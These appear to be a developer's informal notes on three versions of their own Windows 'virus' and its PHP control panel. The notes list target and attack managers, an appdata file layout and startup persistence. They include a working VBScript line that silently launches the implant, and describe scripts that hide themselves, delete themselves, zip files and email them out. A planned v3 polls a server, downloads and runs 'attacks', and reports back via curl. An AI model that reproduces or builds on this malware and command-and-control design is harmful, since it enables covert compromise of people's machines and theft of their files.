
These are just for a recap on the thoughts and the features of each. For detailed information then please consult the official repo

version 1:
- no compilation by python, no automatic escaping
- half-implemented virus-specific payload
- everything barebones, no gui to manage all of that
- structure looks like from version 2
- files at %appdata%/157239n and startup

version 2:
- compilation by python, automatic escaping.
- writing the actual payload is still sort of barebones, but it's a much better experience overall
- still no location masquerading and no backups
file structure:
controller:
- addAttack.php
- addDirectory.php
- addTarget.php
- clearResults.php
- clearVector.php
- compareDirectories.php
- deleteAttack.php
- deleteDirectory.php
- deployCode.php
- mergeDirectories.php
- setAttackId.php
- setTargetId.php
- updateAttack.php
- updateProfile.php
- updateResults.php
data:
- codes/{attack_id}: archived code folder
- datas/{attack_id}: notes after an attack happened
- directories/{directory_id}: directories files
- files/{attack_id}/{file}: files after an attack
- notes/{attack_id}: notes
- profiles/{target_id}: description of each target
model:
- Attack.php
- AttackManager.php
- Authenticator.php
- DirectoryManager.php
- FileManager.php
- FileOps.php
- KDirectory.php
- KSQL.php
- lib.php
- Target.php
- TargetManager.php
tmp: file.txt and file.zip, to handle zip files
tools:
- activeData.txt
- compare.json
- deploy.cmd
- DirToJSON.jar
- DirToJSON.jar.old
- sampleData.txt
front facing:
- attackProfile.php
- dashboard.php
- index.php
- init
- lib.php
- login.php
- newAttack.php
- newDirectory.php
- newTarget.php
- profile.php
- readme.md
- start.php
- test.php
structure:
- startup:
  - SU.vbs: CreateObject("Wscript.Shell").Run chr(34) & "C:\Users\Lenovo-1\AppData\Roaming\157239n\SU.bat" & chr(34), 0, False
- appdata:
  - C.txt: counting
  - cont.txt: adhoc program flow control
  - DI.bat: delete initial (main.cmd)
  - DS.bat: delete self
  - H.bat: ?
  - H.vbs: hiding stuff
  - id: persistent state, virus_id
  - out.zip: zipping stuff
  - S.vbs: sending email
  - SU.bat: entry point
  - Z.vbs: zipping files
GUI:
- originally hosted on u1.kelvinho.org, has domain virus.kelvinho.org
- single user, for myself only, can't manage password without shell access
- no centralized api, which is okay, but mixed styles everywhere and is unmaintainable


version 3:
realizations:
- all of these complexity are not needed. I don't need:
  - powershell to download files
  - vbs to zip files
  - vbs to send emails
  - vbs to start script anonymously
  that's a fuck load of stuff I don't actually need lmao. Just curl every god damn thing. It's an elegant, wonderful thing. Wow. And just start /b a script, no vbs integration necessary (very small one in startup's SU.vbs). I can't believe I was able to build this back then, with all those swinging blades. I didn't understand these systems, but I can still make a product. But now I have, I can do much more than before. Yay
so, proposed new architecture:
startup:
- SU.vbs
appdata:
- state: persistent states. First line is a single number, indicating the number of key-value pairs, then read those into internal variables.
- entry.cmd: entry point. pings the website, checks for new attacks, download them, start new threads to take care of the new attacks.
- newAttacks/{attack_id}: fresh attacks, no thread has begin to execute it.
- attacks/{attack_id}: on going attacks. A thread has been tasked to deal with an attack. It will move the code over to this folder, then executes it synchronously, then reports back to the web server using curl
